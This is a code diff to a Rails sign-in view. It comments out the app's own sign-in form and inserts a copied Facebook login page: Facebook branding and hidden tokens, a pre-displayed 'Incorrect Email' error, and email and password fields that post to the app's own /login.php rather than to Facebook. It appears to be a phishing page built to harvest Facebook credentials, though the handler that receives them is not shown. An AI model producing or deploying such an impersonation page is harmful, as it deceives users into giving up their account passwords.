@@ -1,8 +1,8 @@
 <% provide(:title, " - Sign in") %>
 
+<!-- <div class="hero-unit container-fluid " style="margin-top:70px;">
+  <div class="" style="width: 980px; margin: 0 auto">
 
-<div class="row1 offset8">
-  <div class="span6 ">
 <h1>Sign in</h1>
 <br>
     <%= form_tag "/auth/identity/callback" do %>
@@ -25,10 +25,83 @@
     <div class="fb-login-button topline" data-show-faces="true" data-width="200" data-max-rows="1">
       <%= link_to image_tag("facebook.png", alt: "Facebook"), '#', id: "sign_in_fb" %>
     <%= link_to "Sign in with Facebook", "/auth/facebook", class: "btn primary large sign_in_fb"  %> </div>
-    <br> -->
+    <br> 
 </p>
 
 
 
   </div>
+</div>
+ -->
+
+<div id="globalContainer" class="uiContextualLayerParent">
+  <div id="content" class="fb_content clearfix">
+    <div class="UIFullPage_Container">
+      <div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite">
+        <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+          <div class="clearfix uiHeaderTop">
+            <div class="rfloat">
+              <h2 class="accessible_elem">Facebook Login</h2>
+              <div class="uiHeaderActions">
+              </div>
+            </div>
+            <div>
+              <h2 class="uiHeaderTitle" aria-hidden="true">Facebook Login</h2>
+            </div>
+          </div>
+        </div>
+        <div class="phl ptm uiInterstitialContent">
+          <div class="login_form_container">
+            <form id="login_form" action="/login.php?login_attempt=1" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
+              <input type="hidden" name="lsd" value="AVpWJXLl" autocomplete="off">
+              <div class="hidden_elem">
+              </div>
+              <div class="pam login_error_box uiBoxRed">
+                <div class="fsl fwb fcb">
+                  Incorrect Email
+                </div>
+                <div>
+                  <p>
+                    The email you entered does not belong to any account.
+                  </p>
+                  <p>
+                    You can login using any email, username or mobile phone number associated with your account. Make sure that it is typed correctly.
+                  </p>
+                </div>
+              </div>
+              <div id="loginform">
+                <input type="hidden" autocomplete="off" id="display" name="display" value=""><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value=""><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1"><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value=""><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1"><input type="hidden" autocomplete="off" name="timezone" value="-330" id="u_0_0"><input type="hidden" name="lgnrnd" value="183536_1WAF"><input type="hidden" id="lgnjs" name="lgnjs" value="1391222139">
+                <div class="form_row clearfix">
+                  <label for="email" class="login_form_label">Email or Phone:</label><input type="text" class="inputtext" id="email" name="email" value="">
+                </div>
+                <div class="form_row clearfix">
+                  <label for="pass" class="login_form_label">Password:</label><input type="password" name="pass" id="pass" class="inputpassword">
+                </div>
+                <div class="persistent">
+                  <div class="uiInputLabel clearfix uiInputLabelLegacy">
+                    <input id="persist_box" type="checkbox" value="1" checked="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox"><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label>
+                  </div>
+                </div>
+                <input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="1">
+                <div id="buttons" class="form_row clearfix">
+                  <label class="login_form_label"></label>
+                  <div id="login_button_inline">
+                    <label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="login" type="submit" id="u_0_1"></label>
+                  </div>
+                  <div id="register_link">
+                    or <strong><a href="/r.php?next&amp;locale=en_US&amp;display=page" target="_self" rel="nofollow" id="reg_btn_link" tabindex="-1">Sign up for Facebook</a></strong>
+                  </div>
+                </div>
+                <p class="reset_password form_row">
+                  <a href="https://www.facebook.com/recover/initiate" target="" tabindex="-1">Forgot your password?</a>
+                </p>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+
 </div>
